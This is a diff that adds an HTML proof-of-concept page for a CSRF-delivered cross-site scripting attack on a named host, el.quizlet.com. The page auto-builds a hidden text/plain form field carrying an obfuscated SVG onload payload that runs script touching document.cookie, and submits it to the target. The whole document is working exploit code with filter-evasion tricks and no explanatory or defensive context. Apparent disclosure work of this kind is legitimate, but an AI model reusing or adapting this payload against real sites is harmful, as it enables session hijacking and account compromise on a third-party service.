@@ -1,0 +1,16 @@
+<!DOCTYPE html>
+<html>
+     <body>
+	    <h2>CSRF Based XSS ( el.quizlet.com ) </h2>
+        <form action="https://el.quizlet.com/" method="POST" enctype="text/plain">
+            <input id="input_element" type="hidden" name='[{"event": null, "namespace": null, "type": "' />
+            <input type="submit" value="XSS" style="width: 150px;height: 65px;font-weight: 900;font-size: 20px;" />
+        </form>
+        <script>
+            var prefix = '<svg/onload=top[/al/.source+/ert/.source]('
+            var suffix = ')>"}]'
+            var value = "document.cookie.length"
+            document.getElementById("input_element").value = prefix + value + suffix
+        </script>
+     </body>
+ </html>
